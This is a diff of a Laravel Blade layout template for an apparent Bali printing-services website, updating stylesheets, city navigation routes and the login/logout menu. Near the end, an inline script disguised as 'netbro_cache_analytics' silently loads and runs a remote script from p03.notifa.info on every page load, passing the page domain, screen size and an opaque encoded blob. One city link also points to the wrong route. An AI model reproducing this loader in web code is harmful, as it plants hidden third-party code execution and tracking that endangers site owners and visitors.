@@ -29,6 +29,11 @@
     
     <link href="{{ URL::asset('css/base.css') }}" rel="stylesheet">
     <link href="{{ URL::asset('css/map.css') }}" rel="stylesheet">
+    <link href="{{ URL::asset('css/new_custom.css') }}" rel="stylesheet">
+
+    <!-- SPECIFIC CSS for Profile -->
+	<link href="{{ URL::asset('css/admin.css') }}" rel="stylesheet">
+	<link href="{{ URL::asset('css/jquery.switch.css') }}" rel="stylesheet">
 
     <!-- REVOLUTION SLIDER CSS -->
     <link rel="stylesheet" type="text/css" href="rev-slider-files/fonts/pe-icon-7-stroke/css/pe-icon-7-stroke.css">
@@ -173,15 +178,15 @@
                                             <li><a href="#">Jembrana</a></li>
                                         </ul>
                                     </li> -->
-                                    <li><a href="/printing/denpasar">Denpasar</a></li>
-                                    <li><a href="/printing/badung">Badung</a></li>
-                                    <li><a href="/printing/tabanan">Tabanan</a></li>
-                                    <li><a href="/printing/gianyar">Gianyar</a></li>
-                                    <li><a href="/printing/karangasem">Karangasem</a></li>
-                                    <li><a href="/printing/klungkung">Klungkung</a></li>
-                                    <li><a href="/printing/singaraja">Singaraja</a></li>
-                                    <li><a href="/printing/bangli">Bangli</a></li>
-                                    <li><a href="/printing/jembrana">Jembrana</a></li>
+                                    <li><a href="{{route('everyone.city', 'denpasar')}}">Denpasar</a></li>
+                                    <li><a href="{{route('everyone.city', 'badung')}}">Badung</a></li>
+                                    <li><a href="{{route('everyone.city', 'denpasar')}}">Tabanan</a></li>
+                                    <li><a href="{{route('everyone.city', 'gianyar')}}">Gianyar</a></li>
+                                    <li><a href="{{route('everyone.city', 'karangasem')}}">Karangasem</a></li>
+                                    <li><a href="{{route('everyone.city', 'klungkung')}}">Klungkung</a></li>
+                                    <li><a href="{{route('everyone.city', 'singaraja')}}">Singaraja</a></li>
+                                    <li><a href="{{route('everyone.city', 'bangli')}}">Bangli</a></li>
+                                    <li><a href="{{route('everyone.city', 'jembrana')}}">Jembrana</a></li>
                                 </ul>
                             </li>
 
@@ -207,9 +212,10 @@
                         @guest
                         <li>
                             <div class="dropdown dropdown-cart">
-                            	<form method="POST" action="{{ route('login') }}">
-                            		@csrf
-                            		<div class="dropdown-menu">
+                                <a href="#" class="dropdown-toggle" id="access_link">Sign in</a>
+                                <form method="POST" action="{{ route('login') }}">
+                                    @csrf
+                                    <div class="dropdown-menu">
                                         <div class="form-group">
                                             <input type="text" class="form-control" id="inputUsernameEmail" name="email" placeholder="Email">
                                         </div>
@@ -220,22 +226,35 @@
                                         <input type="submit" name="submit" value="Sign in" class="button_drop outline">
                                         <a href="/register" id="sign_up" class="button_drop outline">Sign up</a>
                                     </div>
-                            	</form>
+                                </form>
                             </div><!-- End Dropdown access -->
                         </li>
-                        @else
+                        @endguest
+                        @auth('web','printing')
                         <li>
                             <div class="dropdown dropdown-cart">
                                 <a href="wishlist.html" id="wishlist_link">Favorite</a>
                             </div>
                         </li>
-                        @endguest      
+                        <li>
+                            <div class="dropdown dropdown-cart">
+                                <a class="dropdown-item" href="{{ route('logout') }}"
+		                            onclick="event.preventDefault();
+									document.getElementById('logout-form').submit();">
+									{{ __('Logout') }}
+	                            </a>
+
+								<form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
+	                            	@csrf
+	                            </form>
+                            </div>
+                        </li>
+                        @endauth      
                     </ul>
                 </nav>
             </div>
         </div><!-- container -->
     </header><!-- End Header -->
-	<br>
 
 	@yield('content')
 
@@ -351,9 +370,10 @@
 			}
 		}); /*ready*/
 	</script>
-	<script src="{{ URL::asset('js/notify_func.js') }}"></script>
+	<!--	<script src="{{ URL::asset('js/notify_func.js') }}"></script>-->
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mtoUdldMukPNcX7dMgCL8PnY7y2hOGqxovCTMJruXZ8pbRLC7MphPasPHHQEYQgKHRD2Pq4E2QWaZrBaVjAndOfCTamuKUaZ9pelA%2f6UxbWWq92Kn7A3WJ%2bfDtdmdjhIl6HYYYrK4M3OnCD5T34AZ%2bmVpoOyLivK2oUTFN9WNW0TmvaFD2QSZt%2f5%2bnIF5Uj3WcEMxghNRoV4xVHMELtvCyc1mVrBBx6EcL5%2b8uNiwDnSqyZ9sZsAMb5utblrfCTBaGpiy6Ox8wrB1z5i5iCof9%2fxN%2bDZXLf4b3xe5XaIY1rL0BEX3HtpVGzbS%2bCmkm0zpr%2ftQtiZno9zWJcjTp3kNj%2f1e0RsAAU%2b1DnOMQnnp9uES5qRDuOCsC8cOdIpRXTpbCQUKFr4HSMlt3tNwA%2fFPdelaiT5B4ea0k%2bZFTuwBn94SABRUE%2f7V01TL%2flLHl838%2bIDdxl670X325US8RwuGWKm4D%2fFZIOV%2bXan3MYE0xUA%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
 </script>
+
 </body>
 </html>
